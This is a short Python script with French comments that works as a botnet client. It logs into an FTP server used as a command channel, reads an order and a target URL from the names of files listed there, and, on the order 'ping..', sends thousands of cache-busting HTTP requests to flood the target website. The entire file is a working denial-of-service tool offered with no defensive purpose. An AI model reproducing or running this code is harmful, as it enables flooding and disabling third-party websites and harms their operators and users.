from ftplib import FTP_TLS
from os import system
import requests
import time
import progressbar

ftp=FTP_TLS()
ftp.set_debuglevel(2)
ftp.connect('IciEntrezAdresseIp')
ftp.sendcmd('USER IciEntrezUserNameFtp')
ftp.sendcmd('PASS IciEntrezPasswordFtp')
files = []
ftp.dir(files.append) #Nous listons les fichiers présents sur le serveur ftp
print(files)
file=files
requete = file[3] #Nous récupérons la 3ème entrée qui contient le fichier possédant l'ordre souhaité en son nom
requeteurl = file[4] #Nous récupérons la cible, la 4eme entrée contient un fichier au nom de l'url cible
objectif = requete[62] + requete[63] + requete[64] + requete[65] + requete[66] +requete[67] #Nous récupérons l'objectif (la 3eme entrée) qui contient 6 caractères max, ici l'objectif est ping, le fichier s'appelle donc ping.. 
print(objectif)

if objectif == ("ping.."):
	h = {
    "Cache-Control": "no-cache", "Pragma": "no-cache"
	} #Nous rechargons complètement la page à chaque requête
	compteur = 0
	tour = 0
	http=("http://")
	url0 = requeteurl[62] + requeteurl[63] + requeteurl[64] + requeteurl[65] + requeteurl[66] +requeteurl[67] + requeteurl[68] + requeteurl[69] + requeteurl[70] + requeteurl[71] + requeteurl[72] + requeteurl[73]  + requeteurl[74] + requeteurl[75] + requeteurl[76] + requeteurl[77] + requeteurl[78] + requeteurl[79] + requeteurl[80] + requeteurl[81] + requeteurl[82] + requeteurl[83] + requeteurl[84] + requeteurl[85] + requeteurl[86] + requeteurl[87] + requeteurl[73] + requeteurl[88] + requeteurl[89] + requeteurl[90] + requeteurl[91] + requeteurl[92] + requeteurl[93] + requeteurl[94] + requeteurl[95] + requeteurl[96] + requeteurl[97] + requeteurl[98] + requeteurl[99] + requeteurl[100] + requeteurl[101]
	url0 = str(url0)
	url1 = url0.split('_')
	url1 = url1[0]
	print(url1)
	urlcible = url1
	urlcible = "https://" + urlcible
	while tour < 10:
		print("Envoi de 1000 requêtes")	
		while compteur < 1000:
			for i in progressbar.progressbar(range(1000)):
				request = requests.get(urlcible, headers=h)
				compteur = compteur + 1
				#Une requête est envoyée à chaque boucle
